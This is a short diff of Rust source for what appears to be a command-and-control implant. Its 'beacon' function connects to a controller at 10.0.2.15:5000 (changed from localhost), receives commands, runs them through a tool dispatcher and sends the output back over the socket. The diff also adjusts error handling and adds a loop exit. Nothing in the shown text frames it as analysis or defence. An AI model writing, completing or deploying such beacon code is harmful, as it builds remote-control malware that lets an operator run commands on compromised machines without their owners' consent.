@@ -85,15 +85,14 @@ pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
         //     return Ok(())
         // }
         _ => {
-            // Return an error if the tool is invalid
-            return Err("Invalid tool".into());
+            Ok(String::from("Invalid tool"))
         }
 
     }
 }
 
 pub fn beacon() {
-    if let Ok(mut stream) = TcpStream::connect("127.0.0.1:5000") {
+    if let Ok(mut stream) = TcpStream::connect("10.0.2.15:5000") {
         loop {
             let mut buffer = [0; 1024];
             if let Ok(n) = stream.read(&mut buffer) {
@@ -103,6 +102,8 @@ pub fn beacon() {
                     let result = run(tool).unwrap();
                     // println!("{}", result);
                     let _ = stream.write(result.as_bytes()).unwrap();
+                } else {
+                    break;
                 }
             }
         } 
